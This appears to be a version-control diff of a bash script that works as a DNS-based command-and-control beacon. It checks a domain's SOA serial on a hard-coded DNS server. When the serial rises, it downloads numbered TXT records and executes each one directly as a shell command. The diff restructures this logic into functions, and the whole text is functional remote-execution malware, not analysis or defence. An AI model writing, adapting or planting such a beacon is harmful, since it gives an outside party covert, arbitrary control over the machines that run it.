@@ -1,20 +1,36 @@
 #!/bin/bash
 # Beacon to DNS server 
 
-domain=".dosh.cloud"
+domain="dosh.cloud"
+current=0
+# Pull down commands from server
+pull(){
+    # Get number of commands to query for
+    num=$(dig @129.21.130.212 -t txt +short num.dosh.cloud)
+    len=$(echo ${#num})
+    num=$(echo ${num:1:len-2})
 
-# Get the number of commands to query for
-num=$(dig @129.21.130.212 -t txt +short num.dosh.cloud)
-len=$(echo ${#num})
-num=$(echo ${num:1:len-2})
-echo $num
+    # Loop through gathering each command and executing
+    x=1
+    while [ $x -le $num ]; do
+        cmd=$(dig @129.21.130.212 -t txt +short $x.$domain)
+        len=$(echo ${#cmd})
+        cmd=$(echo ${cmd:1:len-2})
+        $cmd
+        let x=x+1
+    done
+}
 
-# Loop through gathering each command and executing
-x=1
-while [ $x -le $num ]; do
-    cmd=$(dig @129.21.130.212 -t txt +short $x$domain)
-    len=$(echo ${#cmd})
-    cmd=$(echo ${cmd:1:len-2})
-    $cmd
-    let x=x+1
-done
+check(){
+    serial=$(dig @129.21.130.212 -t soa +short $domain | awk '{print $3}')
+    echo $serial
+}
+# Main driver for beacon
+main(){
+    new=$(check)
+    if [ $new -gt $current ]; then
+        pull
+    fi
+}
+
+main
